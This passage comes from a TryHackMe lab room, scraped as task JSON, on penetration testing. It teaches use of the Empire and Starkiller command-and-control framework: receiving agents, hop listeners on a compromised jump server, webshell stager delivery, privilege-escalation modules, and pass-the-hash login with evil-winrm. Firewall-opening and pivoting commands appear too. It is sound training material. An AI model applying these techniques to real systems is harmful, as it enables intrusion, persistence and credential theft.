target="_blank">here-document</a> </i>to execute the entire script without ever writing it to the disk. </p><p align="left">That said, this is overkill. If we read through the script we can see that it is in three main parts:<br /><img style="width:948px" alt="Isolating the shebang, payload, and cleanup aspects of the script via highlighting. Line 1 is the shebang, line 2 is the payload, lines 3 and 4 are the cleanup." src="https://assets.tryhackme.com/additional/wreath-network/bed26471fb22.png" /><br /></p><div align="left"><ul><li>In the green square we have the <i>shebang</i>. This tells the shell which interpreter to run the script under. In this case the script would be run using <code>/bin/bash</code></li><li>The red square contains the payload itself. This is the section we\'re interested in</li><li>The blue square contains post processing commands. Specifically these two lines tell the script to delete itself then exit</li></ul></div><p align="left">Knowing this, we can just copy everything in the red square then execute it in a terminal on the target:<br /><img style="width:955px" alt="Demonstration of executing the payload on the target manually by copying the payload from the stager and pasting it into a shell." src="https://assets.tryhackme.com/additional/wreath-network/0d056c07dc42.png" /></p><p align="left">This results in an agent being received by our waiting listener.</p><p align="left">In the Empire CLI receiving a listener looks something like this:<br /><img style="width:547px" alt="Showing what a received agent looks like in Empire CLI" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/2c40df48c20b.png" /></p><p align="left">We can then type <code>agents</code> and hit enter to see a full list of available agents:<br /><img style="width:1075px" alt="Using the agents command to view all available agents" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/dd75d7655190.png" /><br /></p><p align="left">To interact with an agent, we use <code>interact AGENT_NAME</code> -- as per usual a dropdown with autocompletes will assist us here. This puts us into the context of the agent. We can view the full list of available commands with <code>help</code>:<br /><img style="width:930px" alt="Demonstrating how to interact with an agent and use the help menu" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/58e64472c5ae.png" /><br /></p><p align="left">Note that this menu will change depending on the stager we used.</p><p align="left">When we have finished with our agent we use <code>back</code> to switch context back to the agents menu. This doesn\'t destroy the agent, however. If we did want to kill our agent, we would do it with <code>kill AGENT_NAME</code>:<br /><img style="width:374px" alt="Demonstrating how to exit and kill an agent using the back and kill commands" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/2c32ca6d0224.png" /></p><p align="left">We can also rename agents using the command: <code>rename AGENT_NAME NEW_AGENT_NAME</code>.<br /></p><hr align="left" /><p align="left">To interact with agents In Starkiller we go to the Agents tab on the left hand side of the screen:<br /><img style="width:264px" alt="Highlighting the agents menu in Starkiller" src="https://assets.tryhackme.com/additional/wreath-network/f72d55e49b79.png" /><br /></p><p align="left">Here we will see that our agent has checked in!<br /><img style="width:100%" alt="Showing what an agent checking in looks like in the Starkiller GUI" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/52199197fe7a.png" /><br /></p><p align="left">To interact with an agent in Starkiller we can either click on its name, or click on the "pop out" button in the actions menu.<br /></p><p align="left">This results in a menu which gives us access to a variety of amazing features, including the ability to execute modules (more on these soon), execute commands in an interactive shell, browse the file system, and much more. Be sure to play around with this before moving on!<br /><img style="width:100%" alt="Showing the popout menu for interacting with the received agent" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/fe886b4ba6bb.png" /><br /></p><p align="left">To delete agents in Starkiller we can use either the trashcan icon in the pop-out agent Window, or the kill button in the action menu for the agent back in the Agents tab of Starkiller.<br /></p>', 'taskType': 'none', 'taskNo': 27, 'taskCreated': '2021-01-10T23:00:06.442Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<div align="left">Using the <code>help</code> command for guidance: in Empire CLI, how would we run the <code>whoami</code> command inside an agent?<br /></div>', 'hint': ''}, {'questionNo': 2, 'question': '<p align="left">We have now covered the basics of Empire, with the exception of \nmodules, which we will look at after getting an agent back from the Git \nServer.</p><p align="left">Kill your agents on the webserver then let\'s look at proxying Empire agents!</p>', 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background-color:rgba(123,198,252,.18);color:#7bc6fc">Command and Control</span> Empire: Hop Listeners', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/__Aej5xeHZU" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p align="left">As mentioned previously, Empire agents can\'t be proxied with a socat relay or any equivalent redirects; but there must be a way to get an agent back from a target with no outbound access, right?</p><p align="left">The answer is yes. We use something called a Hop Listener.</p><p align="left">Hop Listeners create what looks like a regular listener in our list of listeners (like the http listener we used before); however, rather than opening a port to receive a connection, hop listeners create files to be copied across to the compromised "jump" server and served from there. These files contain instructions to connect back to a normal (usually HTTP) listener on our attacking machine. As such, the hop listener in the listeners menu can be thought of as more of a placeholder -- a reference to be used when generating stagers. </p><p align="left">If this doesn\'t make much sense just now, don\'t worry! Hopefully it will once we have worked through an example.</p><p align="left">The hop listener we will be working with is the most common kind: the <code>http_hop</code> listener.</p><div align="left">When created, this will create a set of <code>.php</code>\n files which must be uploaded to the jumpserver (our compromised \nwebserver) and served by a HTTP server. Under normal circumstances this \nwould be a trivial task as the compromised server already has a \nwebserver running; however, out of courtesy to anyone else attempting \nthe network, we will not be using the installed webserver.</div><hr align="left" /><p align="left">Let\'s first look at starting the listener in Empire CLI.</p><p align="left">Switch into the context of the listener using <code>uselistener http_hop</code> from the main Empire menu (you may need to use <code>back</code> a few times to get out of any agents, etc). There are a few options we\'re interested in here:<br /><img style="width:75%" alt="Highlighting the options needing set for the http_hop listener: RedirectListener, Host, and Port" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/8fff79486323.png" /><br /></p><p align="left">Specifically we need:-</p><div align="left"><ul><li>A <b>RedirectListener</b> -- this is a regular listener to forward any received agents to. Think of the hop listener as being something like a relay on the compromised server; we still need to catch it with something! You could use the listener you set up earlier for this, or create an entirely new HTTP listener using the same steps we used earlier. Make sure that this matches up with the name of an already active listener though!<br /></li><li>A <b>Host</b>  -- the IP of the compromised webserver (<code>.200</code>).</li><li>A <b>Port</b> --  this is the port which will be used for the webserver hosting our hop files. Pick a random port here (above 15000), but remember it!</li></ul></div><p align="left">When filled in, our options should look something like this:<br /><img style="width:75%" alt="Showing the full options for the hop_listener when set. Also executing the listener." src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/0a85d9e55345.png" /><br /></p><p align="left">As shown in the screenshot, we then once again use <code>execute</code> to start the listener.</p><p align="left">This will have written a variety of files into a new <code>http_hop</code> directory in <code>/tmp</code> of our attacking machine. We will need to replicate this file structure on our jump server (the compromised <code>.200</code> webserver) when we serve the files. Notice that these files (<code>news.php</code>, <code>admin/get.php</code>, and <code>login/process.php</code>) would not look out of place amongst genuine web application files -- and indeed could easily be discretely merged into an existing webapp. </p><hr align="left" /><p align="left">Let\'s look at setting up a <code>http_hop</code> listener in Starkiller.</p><p align="left">By this stage you should be fairly familiar with this process, so we will go through this quickly.</p><p align="left">Switch back to the Listeners menu in Starkiller using the menu at the left-hand side of the screen:<br /><img style="width:253px" alt="Showing the listeners menu in Starkiller again" src="https://assets.tryhackme.com/additional/wreath-network/fed6f29eee3a.png" /><br /></p><p align="left">Create a new listener and choose "http_hop" for the type. We then fill in the options much like with the Empire CLI Client:<br /><img style="width:100%" alt="Filling in the options for the http_hop listener in Starkiller" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/c7a7339d03cb.png" /><br /></p><p align="left">Again, we set the <b>Host</b> (<code>.200</code>), <b>Port</b>, and <b>RedirectListener</b>.<br /></p><p align="left"><i><b>Note: </b>if you also have a Hop Listener set up using the Empire CLI then you should also change the OutFolder to avoid overwriting the previously generated files.</i></p><p align="left">Click "Submit", and the listener starts!<br /></p>', 'taskType': 'none', 'taskNo': 28, 'taskCreated': '2021-01-15T23:33:45.824Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Create a <code>http_hop</code> listener in Empire CLI and/or Starkiller.<br />', 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background-color:rgba(123,198,252,.18);color:#7bc6fc">Command and Control</span> Git Server', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/yMu2nRjDVVA" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p align="left">Time to put this all into practice!</p><p align="left">You should already have a <code>http_hop</code> listener started in either Empire or Starkiller from the last task. If you don\'t, take this opportunity to start one before continuing.</p><p align="left">With the listener started there are two things we must do before we can get an agent back from the Git Server:-</p><div align="left"><ul><li>We must generate an appropriate stager for the target</li><li>We must put the <code>http_hop</code> files into position on .200, and start a webserver to serve the files on the port we selected during the listener creation. This server must be able to execute PHP, so a PHP Debug server is ideal</li></ul></div><hr align="left" /><p align="left">Let\'s start with generating a stager. For this we will use the <code>multi/launcher</code> stager. We already covered how to create stagers back in task 26, so you should be able to do this relatively unguided. The only option needing to be set here is the "Listener" option, which needs set to the name of the <code>http_hop</code> listener we created in the previous task:</p><p align="left"><b>Empire CLI:</b><br /><img style="width:746px" alt="Setting the Listener option for the http_hop listener in Empire CLI Client" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/948827be57c0.png" /></p><p align="left"><b>Starkiller:</b><br /><img style="width:75%" alt="Making a multi/launcher in Starkiller" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/18461d0a00ec.png" /></p><p align="left">If using the Empire CLI, you will be presented with a payload to copy and paste into the target\'s command line:<br /><img style="width:956px" alt="Showing the payload generated by Empire CLI to be copied into the target command line" src="https://assets.tryhackme.com/additional/wreath-network/597e71846d80.png" /><br /></p><p align="left">If using Starkiller you can copy the payload to your clipboard by clicking on the copy button of the Actions menu for the stager in the main Stagers menu:<br /><img style="width:100%" alt="Showing the payload generated by Starkiller" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/df9e3449f125.png" /><br /></p><p align="left">Whichever method you chose, save the provided command somewhere and <i>do not</i> execute it yet. We will need it once we have set up the hop files on the jumpserver.<br /></p><hr align="left" /><p align="left">Now let\'s get that jumpserver set up!</p><p align="left">First of all, in the /tmp directory of the compromised webserver, create and enter a directory called <code>hop-USERNAME</code>. e.g.:<br /><img style="width:396px" alt="Creating a directory called hop-USERNAME in the /tmp directory of the compromised webserver. e.g. mkdir /tmp/hop-USERNAME, cd /tmp/hop-USERNAME" src="https://assets.tryhackme.com/additional/wreath-network/d2ca11ee5470.png" /><br /></p><p align="left">Transfer the contents from the <code>/tmp/http_hop</code> (or whatever you called it) directory across to this directory on the target server. A good way to do this is by zipping up the contents of the directory (<code>cd /tmp/http_hop &amp;&amp; zip -r hop.zip *</code>), then transferring the zipfile across using one of the methods previously shown. For example, doing this with a Python HTTP server:<br /><img style="width:1075px" alt="Demonstrating transferring the zip file using a Python HTTP server, as well as how to zip the file up." src="https://assets.tryhackme.com/additional/wreath-network/b3fa83178a6e.png" /><br /></p><p align="left">We can then unzip the zipfile on the webserver (i.e. <code>unzip hop.zip</code>):<br /><img style="width:431px" alt="Demonstrating unzipping the file on the target" src="https://assets.tryhackme.com/additional/wreath-network/f5e072039e18.png" /><br /></p><p align="left"><i><b>Note: </b>the output of </i><code>ls</code><i> </i>must <i>match up with the screenshot -- i.e. there should be a </i><code>news.php</code><i> file in your current directory, with </i><code>admin/</code><i> and </i><code>login/</code><i> as subdirectories.</i><br /></p><p align="left">We now need to actually serve the files on the port we chose when generating the http_hop listener (task 28). Fortunately we already know that this server has PHP installed as it serves as the backend to the main website. This means that we can use the PHP development webserver to serve our files! The syntax for this is as follows:<br /><code>php -S 0.0.0.0:PORT &amp;&gt;/dev/null &amp;</code><br /></p><p align="left">e.g:<br /><img style="width:822px" alt="Demonstrating the process of setting up the PHP debug server" src="https://assets.tryhackme.com/additional/wreath-network/b46fe13b58a7.png" /></p><p align="left">As shown in the screenshot, the webserver is now listening in the background on the chosen port 47000.</p><p align="left"><i><b>Note: </b>Remember to open up the port in the firewall if you haven\'t already!</i><br /></p><p align="left">This is a handy trick for when we need to serve PHP files, as our standard Python HTTP webserver is not capable of interpreting the PHP language and so cannot execute the scripts.</p><hr align="left" /><p align="left">We now have everything we need to get this show on the road!<br /></p>', 'taskType': 'none', 'taskNo': 29, 'taskCreated': '2021-01-16T21:34:07.832Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p align="left">Both the reverse shell we received way back in task 19, and our evil-winrm access are already running in Powershell, so we would need to adapt the stager generated for us by Empire in order to use them. Instead, it is easier to use it with the webshell we originally used to compromise the machine (i.e. paste the stager as the value of the "a" parameter in cURL or BurpSuite), remembering to URL encode the stager first.<br /></p><p align="left">After sending the web request, you should receive an agent in Empire CLI / Starkiller!<br /><img style="width:535px" alt="Receiving the agent" src="https://assets.tryhackme.com/additional/wreath-network/8f727d417f68.png" /></p><p align="left">Note that the IP here is still <code>.200</code>. This is due to the \njumpserver in between our target (the Git server) and our Empire client \nacting as a proxy in and out of the network.</p><p align="left">Bearing this in mind, get an agent back from the Git Server!<br /></p>', 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background-color:rgba(123,198,252,.18);color:#7bc6fc">Command and Control</span> Empire: Modules', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/ICYUaPShHKQ" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p align="left">As mentioned previously, modules are used to perform various tasks on a compromised target, through an active Empire agent. For example, we could use Mimikatz through its Empire module to dump various secrets from the target.</p><p align="left">As per usual, let\'s look at loading modules in both Empire CLI and Starkiller.</p><hr align="left" /><p align="left">Starting with Empire CLI:</p><p align="left">Inside the context of an agent, type <code>usemodule </code>. As expected, this will show a dropdown with a huge list of modules which can be loaded into the agent for execution.</p><p align="left">It doesn\'t really matter here as we already have full access to the target, but for the sake of learning, let\'s try loading in the Sherlock Empire module. This checks for potential privilege escalation vectors on the target.<br /><code>usemodule powershell/privesc/sherlock</code><br /><img style="width:558px" alt="Demonstration of loading the sherlock module" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/081792f6213e.png" /><br /></p><p align="left">As previously, we can use <code>options</code> to get information about the module after loading it in.</p><p align="left">This module requires one option to be set: the <code>Agent</code> value. This is already set for us here; however, if it was incorrect or there was no option set already then we could set it using the command: <code>set Agent AGENT_NAME</code>, (the same syntax as in previous parts of the framework).<br /></p><p align="left">We start the module using the usual <code>execute</code> command. The module will then run as a background job, returning the results when it completes.<br /><img style="width:561px" alt="Executing the module in Empire CLI Client" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/8ec5020e81a2.png" /><br /><br /></p><p align="left">If we know approximately what we want to do, but don\'t know the exact path to a module, we can just type <code>usemodule NAME_OF_MODULE</code> and it should come up in the dropdown menu:<br /><img style="width:528px" alt="Demonstrating searching for modules using the dropdown menu" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/02eba19664ee.png" /><br /></p><hr align="left" /><p align="left">Now let\'s do the same thing in Starkiller.</p><p align="left">First we switch over to the modules menu:<br /><img style="width:248px" alt="Showing the modules menu in Starkiller" src="https://assets.tryhackme.com/additional/wreath-network/43556845ab7b.png" /></p><p align="left">In the top right corner we can search for our desired module. Let\'s search for the Sherlock module again:<br /><img style="width:1048px" alt="Demonstrating the search function at the top right of the Starkiller Modules interface" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/ec88bc6ff7b5.png" /><br /></p><p align="left">Select the module by clicking on its name.<br /></p><p align="left">From here we click on the Agents menu, then select the agent(s) to use the module through:<br /><img style="width:981px" alt="Demonstrating what adding an agent looks like in Starkiller" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/fc2e34bbfd15.png" /><br /></p><p align="left">Click Submit to run the module!</p><p align="left">To view the results we need to switch over to the "Reporting" section of the main menu on the left side of the window:<br /><img style="width:251px" alt="Showing the reporting tab found in the left hand menu of Starkiller" src="https://assets.tryhackme.com/additional/wreath-network/f8553e45f903.png" /><br /></p><p align="left">From here we can see the task we just ran, showing the Agent in use, the event type, command, user, and a timestamp.<br /><img style="width:983px" alt="Highlighting the down arrow used to show the task results in the reporting section" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/f57165fc44fc.png" /></p><p align="left">Clicking on the dropdown arrow to the left of the task gives the task results:<br /><img style="width:100%" alt="Demonstration of possible task results from a finished task in Starkiller" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/213d58186b7f.png" /><br /></p>', 'taskType': 'none', 'taskNo': 30, 'taskCreated': '2021-01-10T23:00:16.524Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Read the above information and try to experiment with the Empire Modules available.<br />', 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background-color:rgba(123,198,252,.18);color:#7bc6fc">Command and Control</span>  Empire: Interactive Shell', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/u_yJh4fnwXo" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>The interactive shell was a new feature in Empire 4.0. It effectively allows you to access a traditional pseudo-command shell from within Starkiller or the Empire CLI Client. This can be used to execute PowerShell commands, as you would in a Powershell reverse shell.</p><p>To access the interactive shell in the Empire CLI Client, we can use the <code>shell</code> command from within the context of an agent:<br /><img alt="Demonstration of using the shell command to drop into an interactive shell in the Empire Client CLI" style="width:321px" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/a864fce42efc.png" /><br /></p>In Starkiller this is even easier as the shell can be found directly in the Agent interaction interface:<br /><img style="width:1076px" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/c1b8fc62f751.png" /><p></p><p>Whilst not quite as "familiar" as the command line shell, this gives us the exact same access.<br /></p><p></p><p></p><p></p>', 'taskType': 'none', 'taskNo': 31, 'taskCreated': '2021-07-04T13:45:59.690Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Find and use the interactive shell in both the Empire CLI Client and in Starkiller.', 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background-color:rgba(123,198,252,.18);color:#7bc6fc">Command and Control</span> Conclusion', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/u_yJh4fnwXo" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p align="left">We have now covered the fundamentals of working with a command and control framework. Empire is significantly more extensive than the basics we have looked at in the time and space available here, so it\'s well worth doing some more research on it in your own time!</p><p align="left">The overarching take-aways from this section are:<br /></p><div align="left"><ul><li>C2 Frameworks are used to consolidate access to a compromised machine, as well as streamline post-exploitation attempts</li><li>There are many C2 Frameworks available, so look into which ones work best for your use case</li><li>Empire is a good choice as a relatively well-rounded, open source C2 framework</li><li>Empire is still in active development, with upgrades and new features being released frequently</li><li>Starkiller is a GUI front-end for Empire which makes collaboration using the framework very easy</li></ul></div><p align="left">This has very much been a whistle-stop tour of both the Empire framework and the topic in general, but hopefully it has been useful nonetheless.<br /></p>', 'taskType': 'none', 'taskNo': 32, 'taskCreated': '2021-01-21T12:15:22.024Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Read the C2 Conclusion<br />', 'hint': ''}, {'questionNo': 2, 'question': '<p><b>[Bonus Exercise] </b>Try working through this section again, using a different C2 Framework of your choice. You can use the C2 matrix to help with this.<br /></p>', 'hint': ''}]}, {'taskTitle': '<span class="badge badge-soft-success size-16">Personal PC</span> Enumeration', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/6wtuTnStdZk" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p align="left"></p><p align="left">We will soon be moving on to the final teaching point of this network: Anti-virus evasion techniques.</p><p align="left">Before we can do that, however, we first need to scope out the final target!</p><p align="left">We know from the briefing that this target is likely to be the other Windows machine on the network. By process of elimination we can tell that this is Thomas\' PC which he told us has antivirus software installed. If we\'re very lucky it will be out of date though!</p><p align="left">As always, we need to enumerate the target before we can do anything else, but how can we do this from a compromised Windows host? As mentioned way back in the Pivoting Enumeration task, Nmap won\'t work on Windows unless it\'s been properly installed on the target. Scanning through one proxy is bad, but at this point we\'d be scanning through <i>two</i> proxies, which would be unbearable. We could write a tool to do it for us, but let\'s leave that for the time being (there will be more than enough coding in the upcoming section as it is!). Instead, let\'s look closer to home and ask one burning question:</p><p align="left"><b>How do Empire Modules work?</b></p><p align="left">For the most part Empire modules are quite literally just scripts (usually in PowerShell) that are executed by the framework through an active agent.\xa0 In other words, these are just PowerShell scripts, and we have PowerShell access to the target.</p><p align="left">For the sake of learning, let\'s upload the Empire Port Scanning script and execute it manually on the target. </p><hr align="left" /><div align="left">In our current situation (on an isolated target, communicating through a jumpserver), under normal circumstances uploading tools manually would usually be something of a chore -- think relays and webservers. Fortunately evil-winrm gives us several easy options for transferring and including tools.</div><p align="left"></p><p align="left"><u><b><span style="font-size:18px">Upload/Download:</span></b></u><br />The first option available to us is the in-built Upload/Download feature built into the tool. From within evil-winrm we can use <code>upload LOCAL_FILEPATH REMOTE_FILEPATH</code> to upload files to the target. Conversely, we can use <code>download REMOTE_FILEPATH LOCAL_FILEPATH</code> to download files back from the target. These could come in handy if we, say, wanted to upload a tool to the target, save the results from running it to a log file, then download the log file back to our attacking machine for storage. In both instances if we miss out the destination filepath (e.g. the remote filepath on upload, or the local filepath on download), the tool will be uploaded into our current working directory.<br /></p><p align="left">For example:<br /><img style="width:954px" alt="Demonstrating a file upload in Evil-WinRM using nc.exe as an example" src="https://assets.tryhackme.com/additional/wreath-network/e02003103ad1.png" /></p><p align="left">In this example we upload an example tool (<code>nc.exe</code>) to <code>C:\\Windows\\Temp</code>, we then create a new file (<code>demo.txt</code>) and download it to the current working directory. Note that in the real world using the <code>C:\\Windows\\Temp</code> directory is often a bad idea as it\'s flagged as a common location for hackers to upload tools. In this case we are using it to keep the box neat and tidy for other users. <br /></p><p align="left"><u><b><span style="font-size:18px">Local Scripts:</span></b></u><br />Uploading tools is all well and good, but if the tool happens to be a PowerShell script then there is another (even more convenient) method. If you check the help menu for evil-winrm, you will see an interesting <code>-s</code> option. This allows us to specify a local directory containing PowerShell scripts -- these scripts will be made accessible for us to import directly into memory using our evil-winrm session (meaning they don\'t need to touch the disk at all). For example, if we happened to have our scripts located at <code>/opt/scripts</code>, we could include them in the connection with:<br /><code>evil-winrm -u USERNAME\xa0 -p PASSWORD -i IP -s /opt/scripts</code><br /></p><p align="left">Let\'s use this option to include the Empire Portscan module.</p><p align="left">The Empire scripts are stored at <code>/usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/</code> if you installed using apt as recommended. A copy of this tool is also included in the zipfile attached to Task 1, or can be downloaded <a href="https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/situational_awareness/network/Invoke-Portscan.ps1" target="_blank">here</a>, if you can\'t find it locally.<br /></p><p align="left">Regardless, we can now sign in as the Administrator using the password hash discovered previously, including the Empire network scanning scripts:<br /><code>evil-winrm -u Administrator -H HASH -i IP -s EMPIRE_DIR</code><br /></p><p align="left">Type <code>Invoke-Portscan.ps1</code> and press enter to initialise the script.<br /></p><p align="left">Now if we type <code>Get-Help Invoke-Portscan</code> we should see the help menu for the tool without having to import or upload anything manually!<img style="width:601px" alt="Demonstrating the Get-Help cmdlet for the imported function" src="https://assets.tryhackme.com/additional/wreath-network/67448956442a.png" /></p><hr /><p align="left">The Empire Portscan module is designed to be similar to Nmap in terms of syntax. You are encouraged to read through the full help menu for the tool; however, we only need two switches: <code>-Hosts</code> and <code>-TopPorts</code>. We <i>could</i> use the <code>-Ports</code> switch and just scan a range of ports, but for the sake of speed we can use the -TopPorts switch to scan a user-specified number of the most commonly open ports. For example, <code>-TopPorts 50</code> would scan the 50 most commonly open ports. </p><p align="left">The full command would then look like this (using the top 50 ports and our example of 172.16.0.10):<br /><code>Invoke-Portscan -Hosts 172.16.0.10 -TopPorts 50</code><br /></p>', 'taskType': 'none', 'taskNo': 33, 'taskCreated': '2021-01-20T23:24:46.549Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Scan the top 50 ports of the last IP address you found in Task 17. Which ports are open (lowest to highest, separated by commas)?<br />', 'hint': ''}]}, {'taskTitle': '<span class="badge badge-soft-success size-16">Personal PC</span> Pivoting', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/VQLeS1uIrVk" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>We found two ports open in the previous task. RDP won\'t be of much use to us without credentials (or at least a hash, although Pass-the-Hash attacks are often restricted through RDP anyway); however, the webserver is worth looking into. Wreath told us that he worked on his website using a local environment on his own PC, so this bleeding-edge version may contain some vulnerabilities that we could use to exploit the target. Before we can do that, however, we must figure out how to access the development webserver on Wreath\'s PC from our attacking machine. </p><p>We have two immediate options for this: Chisel, and Plink.</p>', 'taskType': 'none', 'taskNo': 34, 'taskCreated': '2021-01-23T23:58:51.502Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>If you followed the recommended route of using sshuttle to pivot from the \nwebserver then a <i><u>chisel forward proxy</u></i> is recommended here as it will be \nrelatively easy to connect to through the sshuttle connection without requiring a relay -- look back at the Chisel task if you need help with this! </p><p>When using this option you will need to open up a port in the Windows firewall to allow the forward connection to be made. The syntax for opening a port using <code>netsh</code> looks something like this:<br /><code>netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT</code></p><p>Please use the <code>name-USERNAME</code> naming convention -- for example:<br /><code>netsh advfirewall firewall add rule name="Chisel-MuirlandOracle" dir=in action=allow protocol=tcp localport=47000</code><br /><img style="width:920.3px" alt="Demonstration of the above firewall rule through WinRM" src="https://assets.tryhackme.com/additional/wreath-network/31589c0e89b3.png" /></p><p>Whether you choose the recommended option or not, get a pivot up and running!<br /></p>', 'hint': 'If using chisel, run the chisel server on the Gitserver and the chisel client on your attacking machine.'}, {'questionNo': 2, 'question': '<p>Access the website in your web browser (using FoxyProxy if you used the recommended forward proxy, or directly if you used a port forward). </p><p>Using the Wappalyzer browser extension (<a href="https://addons.mozilla.org/en-GB/firefox/addon/wappalyzer/" target="_blank">Firefox</a> | <a href="https://chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg?hl=en" target="_blank">Chrome</a>) or an alternative method, identify the server-side Programming language (including the version number) used on the website.<br /></p>', 'hint': ''}]}, {'taskTitle': '<span class="badge badge-soft-success size-16">Personal PC</span> The Wonders of Git', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/_uH2A5FExyI" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>It seems we guessed right! It appears to be a carbon copy of the \nwebsite running on the webserver. If there are any differences here then\n they are clearly not going to be immediately visible, which means we \nmay need to look at fuzzing this site through two proxies...</p><p>Before we start messing around with fuzzing tools though, let\'s take a step back and think about this.</p><p>We know from the brief that Thomas has been using git server to version control his projects -- just because the version on the webserver isn\'t up to date, doesn\'t mean that he hasn\'t been committing to the repo more regularly! In other words, rather than fuzzing the server, we might be able to just download the source code for the site and review it locally.</p><p>Ideally we could just clone the repo directly from the server. This would likely require credentials, which we would need to find. Alternatively, given we already have local admin access to the git server, we could just download the repository from the hard disk and re-assemble it locally which does not require any (further) authentication. </p><p>For the sake of practice, let\'s use this latter option.<br /></p>', 'taskType': 'none', 'taskNo': 35, 'taskCreated': '2021-01-24T02:07:17.798Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Use your WinRM access to look around the Git Server. What is the absolute path to the <code>Website.git</code> directory?<br />', 'hint': 'Look at the directories under the root directory (C:\\). Do any of these look unusual?'}, {'questionNo': 2, 'question': '<p>Use <code>evil-winrm</code> to download the entire directory. </p><p>From the directory above Website.git, use:<br /><code>download PATH\\TO\\Website.git</code></p><p>Be warned -- this will take a while, but should complete after a minute or two!</p><p><i><b>Note:</b> You may need to specify the local path as well as the absolute path to the Website.git directory!</i><br /></p>', 